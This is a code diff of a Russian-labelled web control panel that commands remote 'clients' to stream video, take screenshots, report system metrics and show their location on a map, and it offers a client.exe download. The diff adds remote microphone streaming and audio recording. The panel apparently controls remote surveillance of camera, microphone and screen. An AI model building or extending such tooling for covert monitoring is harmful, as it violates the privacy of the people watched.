@@ -1,130 +1,192 @@
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>Управление клиентом {{.}}</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        #videoStream, #screenshotStream {
-            max-width: 100%;
-            height: auto;
-            border: 1px solid #ccc;
-            margin-bottom: 20px;
-        }
-        #serverTime {
-            font-weight: bold;
-            color: #333;
-        }
-        .controls {
-            margin-bottom: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-right: 10px;
-        }
+      body {
+        font-family: Arial, sans-serif;
+        margin: 20px;
+      }
+      #videoStream,
+      #screenshotStream {
+        max-width: 100%;
+        height: auto;
+        border: 1px solid #ccc;
+        margin-bottom: 20px;
+      }
+      #serverTime {
+        font-weight: bold;
+        color: #333;
+      }
+      .controls {
+        margin-bottom: 20px;
+      }
+      button {
+        padding: 10px 20px;
+        font-size: 16px;
+        cursor: pointer;
+        margin-right: 10px;
+        margin-bottom: 10px;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <h1>Управление клиентом {{.}}</h1>
     <div class="controls">
-        <button onclick="sendCommand('start')">Start Streaming</button>
-        <button onclick="sendCommand('stop')">Stop Streaming</button>
-        <button onclick="sendCommand('screenshot')">Take Screenshot</button>
-        <button onclick="sendCommand('metrics')">Get Metrics</button>
-        <button id="download" onclick="downloadClient()">Download Client</button>
-        <button onclick="window.location.href='/map?client={{.}}'">Show on the Map</button>
+      <button onclick="sendCommand('start')">Start Streaming</button>
+      <button onclick="sendCommand('stop')">Stop Streaming</button>
+      <button onclick="sendCommand('screenshot')">Take Screenshot</button>
+      <button onclick="sendCommand('metrics')">Get Metrics</button>
+      <button onclick="sendCommand('mic_start')">Start Mic</button>
+      <button onclick="sendCommand('mic_stop')">Stop Mic</button>
+      <button onclick="sendCommand('record_audio')">Record Audio</button>
+      <button id="download" onclick="downloadClient()">Download Client</button>
+      <button onclick="window.location.href='/map?client={{.}}'">
+        Show on the Map
+      </button>
     </div>
     <p>Server time: <span id="serverTime"></span></p>
-    <img id="videoStream" src="/uploads/latest_frame.jpg" alt="Video Stream">
+    <img
+      id="videoStream"
+      src="../uploads/latest_frame.jpg"
+      alt="Video Stream"
+    />
     <h2>Screenshot</h2>
-    <img id="screenshotStream" src="/uploads/latest_screenshot.jpg" alt="Screenshot Stream">
-    
+    <img
+      id="screenshotStream"
+      src="../uploads/latest_screenshot.jpg"
+      alt="Screenshot Stream"
+    />
+
+    <h2>Микрофонный стрим</h2>
+    <audio id="micStream" controls autoplay>
+      Ваш браузер не поддерживает элемент audio.
+    </audio>
+
+    <h2>Записанное аудио</h2>
+    <audio id="audioStream" controls>
+      <source
+        src="../uploads/latest_recorded_audio.wav?t=<?=Date.now()?>"
+        type="audio/wav"
+      />
+      Ваш браузер не поддерживает элемент audio.
+    </audio>
+
     <h2>Метрики</h2>
     <div id="metrics">Загрузка метрик...</div>
-  
+
     <script>
-        var clientId = "{{.}}";
+      var clientId = "{{.}}";
 
-        function updateTime() {
-            fetch('/api/time')
-                .then(response => response.text())
-                .then(time => {
-                    document.getElementById("serverTime").innerText = new Date(time).toLocaleString();
-                })
-                .catch(error => console.error("Ошибка получения времени:", error));
-        }
+      function updateTime() {
+        fetch("/api/time")
+          .then((response) => response.text())
+          .then((time) => {
+            document.getElementById("serverTime").innerText = new Date(
+              time
+            ).toLocaleString();
+          })
+          .catch((error) => console.error("Ошибка получения времени:", error));
+      }
 
-        function updateImage() {
-            document.getElementById('videoStream').src = `/uploads/latest_frame.jpg?t=${Date.now()}`;
-        }
+      function updateImage() {
+        document.getElementById(
+          "videoStream"
+        ).src = `../uploads/latest_frame.jpg?t=${Date.now()}`;
+      }
 
-        function updateScreenshot() {
-            document.getElementById('screenshotStream').src = `/uploads/latest_screenshot.jpg?t=${Date.now()}`;
-        }
+      function updateScreenshot() {
+        document.getElementById(
+          "screenshotStream"
+        ).src = `../uploads/latest_screenshot.jpg?t=${Date.now()}`;
+      }
 
-        function updateMetrics() {
-            fetch('/clientmetrics?client=' + clientId)
-                .then(response => response.json())
-                .then(data => {
-                    let text = "";
-                    if(Object.keys(data).length === 0) {
-                        text = "Метрики отсутствуют";
-                    } else {
-                        text += "Дисковое пространство: " + formatBytes(data.disk_total) + " (Total), " + formatBytes(data.disk_free) + " (Free)<br>";
-                        text += "Оперативная память: " + formatBytes(data.memory_total) + " (Total), " + formatBytes(data.memory_available) + " (Available)<br>";
-                        text += "Процессор: " + data.processor + "<br>";
-                        text += "ОС: " + data.os;
-                    }
-                    document.getElementById("metrics").innerHTML = text;
-                })
-                .catch(error => {
-                    console.error("Ошибка получения метрик:", error);
-                    document.getElementById("metrics").innerText = "Ошибка получения метрик";
-                });
-        }
+      function updateMic() {
+        document.getElementById(
+          "micStream"
+        ).src = `../uploads/latest_audio.wav?t=${Date.now()}`;
+      }
 
-        function formatBytes(bytes, decimals = 2) {
-            if (bytes === 0) return "0 Bytes";
-            let k = 1024;
-            let dm = decimals < 0 ? 0 : decimals;
-            let sizes = ["Bytes", "KB", "MB", "GB", "TB"];
-            let i = Math.floor(Math.log(bytes) / Math.log(k));
-            return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + " " + sizes[i];
-        }
+      function updateAudio() {
+        document.getElementById(
+          "audioStream"
+        ).src = `/uploads/latest_recorded_audio.wav?t=${Date.now()}`;
+      }
 
-        function sendCommand(cmd) {
-            fetch(`/command?cmd=${cmd}&id=${clientId}`)
-                .then(response => response.text())
-                .then(result => { 
-                    alert("Команда отправлена: " + result); 
-                })
-                .catch(error => console.error("Ошибка отправки команды:", error));
-        }
+      function updateMetrics() {
+        fetch("/clientmetrics?client=" + clientId)
+          .then((response) => response.json())
+          .then((data) => {
+            let text = "";
+            if (Object.keys(data).length === 0) {
+              text = "Метрики отсутствуют";
+            } else {
+              text +=
+                "Дисковое пространство: " +
+                formatBytes(data.disk_total) +
+                " (Total), " +
+                formatBytes(data.disk_free) +
+                " (Free)<br>";
+              text +=
+                "Оперативная память: " +
+                formatBytes(data.memory_total) +
+                " (Total), " +
+                formatBytes(data.memory_available) +
+                " (Available)<br>";
+              text += "Процессор: " + data.processor + "<br>";
+              text += "ОС: " + data.os;
+            }
+            document.getElementById("metrics").innerHTML = text;
+          })
+          .catch((error) => {
+            console.error("Ошибка получения метрик:", error);
+            document.getElementById("metrics").innerText =
+              "Ошибка получения метрик";
+          });
+      }
 
-        function downloadClient() {
-            const link = document.createElement('a');
-            link.href = '/uploads/client.exe';
-            link.download = 'client.exe';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
+      function formatBytes(bytes, decimals = 2) {
+        if (bytes === 0) return "0 Bytes";
+        let k = 1024;
+        let dm = decimals < 0 ? 0 : decimals;
+        let sizes = ["Bytes", "KB", "MB", "GB", "TB"];
+        let i = Math.floor(Math.log(bytes) / Math.log(k));
+        return (
+          parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + " " + sizes[i]
+        );
+      }
 
-        setInterval(() => {
-            updateTime();
-            updateImage();
-            updateScreenshot();
-            updateMetrics();
-        }, 1000);
+      function sendCommand(cmd) {
+        fetch(`/command?cmd=${cmd}&id=${clientId}`)
+          .then((response) => response.text())
+          .then((result) => {
+            alert("Команда отправлена: " + result);
+          })
+          .catch((error) => console.error("Ошибка отправки команды:", error));
+      }
 
+      function downloadClient() {
+        const link = document.createElement("a");
+        link.href = "../uploads/client.exe";
+        link.download = "client.exe";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
+
+      setInterval(() => {
         updateTime();
         updateImage();
         updateScreenshot();
         updateMetrics();
+        updateMic();
+      }, 1000);
+
+      updateTime();
+      updateImage();
+      updateScreenshot();
+      updateMetrics();
+      // updateMic();
     </script>
-</body>
+  </body>
 </html>
